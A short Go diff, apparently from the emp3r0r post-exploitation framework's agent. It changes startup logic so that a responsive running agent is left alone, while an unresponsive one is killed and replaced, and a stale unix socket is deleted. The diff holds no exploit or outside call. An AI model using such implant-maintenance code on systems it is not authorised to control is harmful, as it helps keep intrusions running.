@@ -28,18 +28,23 @@ func main() {
 		log.SetOutput(os.Stderr)
 	}
 
-	if agent.IsAgentAlive() {
-		// if the agent's process name is not "emp3r0r"
-		alive, pid := agent.IsAgentRunningPID()
-		if alive {
-			proc, err := os.FindProcess(pid)
-			if err != nil {
-				log.Println("WTF? The agent is not running, or is it?")
-			}
-			err = proc.Kill()
-			if err != nil {
-				log.Println("Failed to kill old emp3r0r", err)
-			}
+	// if the agent's process name is not "emp3r0r"
+	alive, pid := agent.IsAgentRunningPID()
+	if alive {
+		proc, err := os.FindProcess(pid)
+		if err != nil {
+			log.Println("WTF? The agent is not running, or is it?")
+		}
+
+		// exit, leave the existing agent instance running
+		if agent.IsAgentAlive() {
+			log.Fatal("Agent is already running and responsive, aborting")
+		}
+
+		// if agent is not responsive, kill it, and start a new instance
+		err = proc.Kill()
+		if err != nil {
+			log.Println("Failed to kill old emp3r0r", err)
 		}
 	}
 
@@ -120,8 +125,15 @@ connect:
 func socketListen() {
 	// if socket file exists
 	if agent.IsFileExist(agent.SocketName) {
-		log.Printf("%s exists, aborting socketListen", agent.SocketName)
-		return
+		log.Printf("%s exists, testing connection...", agent.SocketName)
+		if agent.IsAgentAlive() {
+			log.Printf("%s exists, and agent is alive, aborting socketListen", agent.SocketName)
+			return
+		}
+		err := os.Remove(agent.SocketName)
+		if err != nil {
+			log.Fatalf("Failed to delete socket: %v", err)
+		}
 	}
 
 	l, err := net.Listen("unix", agent.SocketName)
